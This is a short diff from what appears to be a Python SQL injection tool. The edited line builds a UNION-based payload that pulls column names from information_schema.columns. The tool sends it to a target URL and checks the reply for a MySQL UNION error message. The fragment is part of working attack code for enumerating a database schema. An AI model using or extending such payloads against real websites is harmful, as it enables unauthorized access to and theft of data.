@@ -237,7 +237,7 @@ if URL_TARGET:
 
                             if args.col:
                                 query = payload_2.replace("2", "column_name")
-                                payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
+                                payload_6 = f"{query} From information_schema.columns"
                                 print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                 result_6 = requests.get(URL_TARGET, payload_6)
                                 if "The used SELECT" in result_6:
